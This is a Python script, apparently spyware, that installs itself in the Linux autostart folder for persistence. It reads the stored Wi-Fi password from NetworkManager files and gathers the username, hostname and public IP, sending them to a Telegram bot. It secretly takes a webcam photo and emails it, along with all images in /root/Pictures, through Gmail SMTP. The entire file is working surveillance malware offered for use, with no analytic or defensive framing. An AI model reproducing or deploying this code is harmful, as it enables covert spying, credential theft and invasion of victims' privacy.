#!/usr/bin/env python
# -*- coding: utf-8 -*-


from subprocess import Popen,PIPE
import requests, sys, signal, pprint ,glob ,os.path ,codecs ,urlparse ,string ,time  ,pyperclip ,netifaces ,data ,ast ,cv2 ,logging ,pyping
import urllib2, json, urllib, re ,subprocess ,os ,socket ,webbrowser ,getpass ,httplib ,ssl ,smtplib ,simplejson ,shutil ,gzip ,tarfile
from subprocess import check_output,CalledProcessError
from selenium import webdriver
from selenium import webdriver
from bs4 import BeautifulSoup
from urllib import quote
from termcolor import colored
import netifaces as ni
import telebot ,urllib3 ,subprocess ,telepot ,telegram
from cv2 import *
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pyric.pyw as pyw


shutil.copy(__file__, '/root/.config/autostart/spy') 

while True :
 if os.path.exists("/root/.config/autostart/spy"):
      os.system("chmod +x root/.config/autostart")

      fromaddr = " gmail sender "
      toaddr = "gmail receiver "  
      msg = MIMEMultipart() 
      msg['From'] = fromaddr 
      msg['To'] = toaddr 
      msg['Subject'] = "spy"

      scanoutput = check_output(["iwgetid"])
      ssid = "WiFi not found"
      for line in scanoutput.split():
        line = line.decode("utf-8")
        if line[:5]  == "ESSID":
               ssid = line.split('"')[1]
               print colored(ssid, 'cyan') 
               w = urllib2.quote(str(ssid), safe='*')
               f=open('/etc/NetworkManager/system-connections/' + str(ssid),'r+') 
               lines=f.readlines()
               for line in lines:
                 if 'psk=' in line :
                     h=(line)
                     print colored(h, 'blue')
                     p = urllib2.quote(str(h), safe='*')

                     user = getpass.getuser()
                     print colored(user, "yellow")

                     host = (socket.gethostname())
                     print colored(host, 'red')

                     res = urllib2.urlopen("https://ident.me/")
                     ipr = res.read()
                     print ipr 

                     requests.get("https://api.telegram.org/bot(token)/sendMessage?chat_id=(id)&text=spy : "+str(user)+"|"+str(host)+"|"+str(p)+"|"+str(ipr)).url   

                     cam = VideoCapture(0)
                     path = '/root'
                     s, img = cam.read()
                     if s:
                         waitKey(0)
                         imwrite(str(path)+"photo.jpg",img)
                         url = "https://api.telegram.org/bot(token)/sendPhoto";
                         files = {'photo': open(str(path)+"photo.jpg", 'rb')}
                         data = {'chat_id' : "id"}
                         r= requests.post(url, files=files, data=data)
                         msg.attach(MIMEText("user: "+ str(user) +"\n"+ "host: "+str(host) +"\n"+ "wifi: "+ str(w) +"\n"+str(h)+"\n"+"ip: "+str(ipr), 'plain'))
                         filename = "photo.jpg"
                         attachment = open(str(path)+"photo.jpg", "rb")
                         p = MIMEBase('application', 'octet-stream')
                         p.set_payload((attachment).read()) 
                         encoders.encode_base64(p)  
                         p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
                         msg.attach(p) 
                         s = smtplib.SMTP('smtp.gmail.com', 587) 
                         s.starttls() 
                         s.login(fromaddr, " gmail sender password ") 
                         text = msg.as_string() 
                         s.sendmail(fromaddr, toaddr, text) 
                         s.quit()
                         os.path.exists("/root/photo.jpg") and os.remove("/root/photo.jpg")

                              

                         d = os.chdir("/root/Pictures")
                         for file in glob.glob("*g"):
                             filename = file
                             attachment = open(file, "rb")
                             p = MIMEBase('application', 'octet-stream')
                             p.set_payload((attachment).read()) 
                             encoders.encode_base64(p)  
                             p.add_header('Content-Disposition', "attachment;filename= %s" % filename) 
                             msg.attach(p) 
                             s = smtplib.SMTP('smtp.gmail.com', 587) 
                             s.starttls() 
                             s.login(fromaddr, " gmail sender password ") 
                             text = msg.as_string() 
                             s.sendmail(fromaddr, toaddr, text) 
                             s.quit() 

 else:
      os.system("pwd")
      shutil.copy(__file__, '/root/.config/autostart/spy')

   
                       



